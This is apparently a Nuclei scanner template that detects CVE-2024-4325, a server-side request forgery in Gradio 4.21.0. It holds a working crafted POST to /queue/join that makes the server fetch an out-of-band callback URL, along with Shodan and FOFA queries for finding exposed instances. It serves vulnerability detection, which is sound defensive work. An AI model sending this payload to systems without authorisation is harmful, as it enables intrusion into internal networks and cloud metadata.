flow: http(1) && http(2)
http:
- matchers:
  - condition: and
    dsl:
    - contains(content_type, "application/json")
    - contains(body, "event_id")
    internal: true
    type: dsl
  raw:
  - "POST /queue/join? HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/json\n\
    \n{\n    \"data\": [\n        [\n            {\n                \"meta\": {\n\
    \                    \"_type\": \"gradio.FileData\"\n                },\n    \
    \            \"path\": \"{{oast}}\",\n                \"url\": \"http://127.0.0.1:7860/file=/tmp/gradio/d1be868eeb62e5194df165ccd8becbc5b3ffb299/favicon.ico\"\
    ,\n                \"orig_name\": \"favicon.ico\",\n                \"size\":\
    \ 15406,\n                \"mime_type\": \"image/x-icon\"\n            }\n   \
    \     ]\n    ],\n    \"event_data\": null,\n    \"fn_index\": 0,\n    \"trigger_id\"\
    : 2,\n    \"session_hash\": \"l8v6ku4cm8d\"\n}\n"
- matchers:
  - condition: and
    part: body
    type: word
    words:
    - Interactsh Server
    - /projectdiscovery/interactsh
  - status:
    - 200
    type: status
  matchers-condition: and
  raw:
  - 'GET /file=/tmp/gradio/{{h_oast}}/oast.fun HTTP/1.1

    Host: {{Hostname}}

    '
id: CVE-2024-4325
info:
  author: iamnoooob,pdresearch
  classification:
    cpe: cpe:2.3:a:gradio_project:gradio:*:*:*:*:*:python:*:*
    cve-id: CVE-2024-4325
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N
    cvss-score: 8.6
    cwe-id: CWE-918
    epss-percentile: 0.97585
    epss-score: 0.4767
  description: 'A Server-Side Request Forgery (SSRF) vulnerability exists in the gradio-app/gradio
    version 4.21.0, specifically within the `/queue/join` endpoint and the `save_url_to_cache`
    function. The vulnerability arises when the `path` value, obtained from the user
    and expected to be a URL, is used to make an HTTP request without sufficient validation
    checks. This flaw allows an attacker to send crafted requests that could lead
    to unauthorized access to the local network or the AWS metadata endpoint, thereby
    compromising the security of internal servers.

    '
  impact: 'Unauthenticated attackers can force the server to make arbitrary requests
    via SSRF, potentially accessing internal services and cloud metadata endpoints.

    '
  metadata:
    fofa-query:
    - body="__gradio_mode__"
    - title="gradio"
    framework: python
    google-query: intitle:"gradio"
    max-request: 2
    product: gradio
    shodan-query:
    - http.html:"__gradio_mode__"
    - http.title:"gradio"
    vendor: gradio_project
    verified: true
  name: Gradio - Server-Side Request Forgery
  reference:
  - https://github.com/advisories/GHSA-973g-55hp-3frw
  - https://nvd.nist.gov/vuln/detail/CVE-2024-4325
  remediation: 'Update Gradio to a version later than 4.21.0 that patches the SSRF
    vulnerability.

    '
  severity: high
  tags: cve,cve2024,gradio,ssrf,cloud,oast,vkev,vuln
variables:
  h_oast: '{{sha1(oast)}}'
  oast: http://oast.fun
